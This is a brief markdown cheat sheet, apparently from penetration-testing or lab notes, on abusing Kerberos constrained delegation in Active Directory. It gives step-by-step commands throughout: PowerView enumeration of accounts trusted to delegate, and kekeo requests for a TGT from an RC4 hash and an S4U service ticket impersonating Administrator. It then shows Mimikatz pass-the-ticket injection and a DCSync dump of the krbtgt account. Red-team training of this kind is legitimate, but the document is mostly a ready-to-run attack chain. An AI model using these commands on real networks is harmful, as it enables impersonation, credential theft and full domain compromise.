# Constrained Delegation

## Methodology/Steps
> 1. List all the users having Constrained Delegation
> 2. Keep a note of the **msDS-AllowedToDelegateTo** value
> 3. Request for a TGT using the hash of the user with CD using kekeo (Which me must have collected before)
> 4. Keep a note of the TGT return ticket
> 5. Now request a TGS with the 2nd step and 4th step values as parameters in */service* and */tgt*
> 6. Keep a note of the TGS return Ticket
> 7. Now we can inject the TGS return Ticket with **Inkove-Mimikatz**
> 8. We can now list the file systems of that account. Example : **`ls \\dc-mysql\C$`** but *can not* use any **WMI-Commands**
> 9. But if the user DC we can do the same process and then do a **DCSync** attack

## Enumerate users and computers with CD enabled
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

## Requesting a TGT
```shell
tgt::ask /user:websvc /domain:domain.local /rc4:cc098f204c5887eaa8253e7c2749156f
tgt::ask /user:dcorp-adminsrv /domain:domain.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
```

## Request a TGS
```shell
tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCAL
tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:time/computer.domain.LOCAL|ldap/computer.domain.LOCAL
```

## Inject the ticket
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS.kirbi"'
```

## Execute DCSync 
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
